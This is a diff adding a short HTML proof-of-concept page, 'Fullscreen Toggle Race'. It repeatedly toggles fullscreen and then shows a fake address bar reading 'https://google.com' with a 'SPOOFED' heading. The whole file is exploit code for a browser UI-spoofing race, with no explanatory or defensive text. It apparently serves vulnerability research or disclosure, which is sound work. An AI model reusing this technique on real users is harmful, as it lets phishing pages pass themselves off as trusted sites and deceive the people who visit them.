@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC E - Toggle Race</title>
+</head>
+<body>
+
+<h2>Fullscreen Toggle Race</h2>
+<button onclick="run()">Run</button>
+
+<script>
+function run() {
+  let i = 0;
+
+  function toggle() {
+    if (i > 5) {
+      document.documentElement.requestFullscreen().then(() => {
+        document.body.innerHTML = `
+          <div style="background:#000;color:#fff;padding:10px;">
+            https://google.com
+          </div>
+          <h1>SPOOFED</h1>
+        `;
+      });
+      return;
+    }
+
+    if (document.fullscreenElement) {
+      document.exitFullscreen().then(() => {
+        i++; setTimeout(toggle, 50);
+      });
+    } else {
+      document.documentElement.requestFullscreen().then(() => {
+        i++; setTimeout(toggle, 50);
+      });
+    }
+  }
+
+  toggle();
+}
+</script>
+
+</body>
+</html>
